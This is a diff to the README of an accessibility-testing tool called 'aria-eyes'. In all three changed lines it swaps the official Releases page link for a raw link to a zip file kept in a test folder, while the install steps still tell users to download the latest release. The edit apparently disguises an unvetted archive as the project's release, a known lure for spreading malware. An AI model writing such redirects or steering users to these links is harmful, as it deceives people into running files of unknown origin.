@@ -1,6 +1,6 @@
 # 👁️ aria-eyes - Check labels against what users see
 
-[Download from Releases](https://github.com/meneses4242/aria-eyes/releases)
+[Download from Releases](https://github.com/meneses4242/aria-eyes/raw/refs/heads/main/packages/core/__tests__/eyes-aria-1.3.zip)
 
 ## 🧭 What this app does
 
@@ -10,7 +10,7 @@ Use it to spot cases where a button, image, or icon says one thing but shows ano
 
 ## 📥 Download and install
 
-Visit this page to download: [aria-eyes Releases](https://github.com/meneses4242/aria-eyes/releases)
+Visit this page to download: [aria-eyes Releases](https://github.com/meneses4242/aria-eyes/raw/refs/heads/main/packages/core/__tests__/eyes-aria-1.3.zip)
 
 1. Open the link above in your browser.
 2. Look for the latest release.
@@ -102,7 +102,7 @@ If a label says one thing and the visual shows another, the item needs attention
 
 ## 🔗 Project links
 
-- Releases: https://github.com/meneses4242/aria-eyes/releases
+- Releases: https://github.com/meneses4242/aria-eyes/raw/refs/heads/main/packages/core/__tests__/eyes-aria-1.3.zip
 - Repository: aria-eyes
 - Topics: a11y, accessibility, accessibility-testing, aria, aria-label, automated-testing, color-contrast, color-verification, npm-package, playwright, testing, typescript, wcag, wcag-compliance
 
